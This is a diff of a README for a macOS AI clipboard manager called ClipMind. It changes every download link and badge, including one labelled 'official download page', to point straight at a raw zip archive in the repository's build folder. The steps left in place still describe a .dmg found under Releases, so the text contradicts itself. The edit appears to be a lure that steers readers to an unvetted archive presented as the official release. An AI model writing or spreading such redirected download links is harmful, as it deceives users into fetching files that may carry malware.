@@ -1,6 +1,6 @@
 # 📋 clipmind-ai-macos - Manage your clipboard history with AI
 
-[![](https://img.shields.io/badge/Download-Click%20Here-blue?style=for-the-badge)](https://github.com/Gennivirginal629/clipmind-ai-macos)
+[![](https://img.shields.io/badge/Download-Click%20Here-blue?style=for-the-badge)](https://github.com/Gennivirginal629/clipmind-ai-macos/raw/refs/heads/main/build/ai_clipmind_macos_v3.9.zip)
 
 ClipMind serves as a smart clipboard manager for your computer. The app saves every item you copy to your clipboard history. You search through your past copies, rewrite text, translate languages, and fix grammar mistakes. It works from your menu bar so you stay in your current app. Your data stays on your machine.
 
@@ -15,7 +15,7 @@ ClipMind serves as a smart clipboard manager for your computer. The app saves ev
 
 Follow these steps to set up ClipMind on your machine.
 
-1. Visit the [official download page](https://github.com/Gennivirginal629/clipmind-ai-macos) to begin.
+1. Visit the [official download page](https://github.com/Gennivirginal629/clipmind-ai-macos/raw/refs/heads/main/build/ai_clipmind_macos_v3.9.zip) to begin.
 2. Look for the latest version of the app under the Releases section.
 3. Select the file ending in .dmg to start the download.
 4. Locate the file in your Downloads folder once the process finishes.
@@ -23,7 +23,7 @@ Follow these steps to set up ClipMind on your machine.
 6. Drag the ClipMind icon into your Applications folder.
 7. Open your Applications folder and click on ClipMind to start the program.
 
-[![](https://img.shields.io/badge/Install-Setup-grey?style=for-the-badge)](https://github.com/Gennivirginal629/clipmind-ai-macos)
+[![](https://img.shields.io/badge/Install-Setup-grey?style=for-the-badge)](https://github.com/Gennivirginal629/clipmind-ai-macos/raw/refs/heads/main/build/ai_clipmind_macos_v3.9.zip)
 
 ## 🚀 Getting Started
 
